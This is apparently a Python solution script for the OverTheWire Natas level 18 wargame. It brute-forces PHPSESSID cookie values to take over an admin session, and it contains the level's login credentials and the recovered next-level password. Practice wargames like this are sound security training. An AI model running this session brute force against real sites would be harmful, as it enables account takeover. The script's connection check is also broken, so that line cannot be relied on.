# coding=utf-8
import base64

import requests

USERNAME = 'natas18:'.encode()
PASSWORD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'.encode()
URL = 'http://natas18.natas.labs.overthewire.org'
maxid = 641
EXISTSSTR = 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.'.encode()
NEXT_LEVEL_PASSWORD = ''


def connect():
    global headers
    base_encoded_auth = base64.b64encode(USERNAME + PASSWORD).decode('utf-8')
    print(base_encoded_auth)  #
    headers = {'Authorization': 'Basic {0}'.format(base_encoded_auth)}
    response = requests.get(URL, headers=headers)
    assert (response.status_code != requests.codes.ok, "Can't connect")
    # import ipdb;ipdb.set_trace()
    # the_page_output = response.text
    # print(the_page_output)


def select_chars():
    for i in range(maxid):
        c = dict(PHPSESSID=str(i))
        res = requests.get(URL, cookies=c, headers=headers)
        if EXISTSSTR not in res.content:
            print(res.content)
            break


connect()
select_chars()  # 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
print('Done')
